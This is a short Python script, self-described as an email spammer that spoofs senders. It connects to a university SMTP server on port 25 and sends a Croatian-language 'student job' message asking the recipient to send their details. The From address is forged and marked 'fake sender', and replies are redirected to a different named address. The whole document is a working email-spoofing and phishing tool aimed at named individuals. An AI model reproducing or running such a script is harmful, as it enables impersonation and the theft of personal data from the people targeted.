# Email Spammer which spoofs emails and spams email using smtp
# Made By Coding With Uday
# Website - http://codeuday.cf/
# YouTube - https://youtube.com/c/codingwithuday
# Discord - </>IsntTaken#0999

# Importing required dependencies
import smtplib
from email.mime.text import MIMEText

# Specifying sender and receivers
sender = 'toperkov@fesb.hr'  # fake sender
receivers = 'Tea.Hrga.00@fesb.hr'
subject = "Studentski posao"

# Specifying smtp
port = 25

# Specifying Smtp Address and Connecting to the server
with smtplib.SMTP('marjan.fesb.hr', port) as server:
    msg = MIMEText(f'Pošaljite svoje podatke za posao')  # Body of the email
    msg['Subject'] = subject  # Subject Of the email
    msg['From'] = sender
    msg['To'] = receivers  # To email again
    msg['reply-to'] = "Ana.Palac.01@fesb.hr"
    # Composing the email
    server.sendmail(sender, receivers, msg.as_string())
    print("Successfully sent email")  # Printing Success Msg
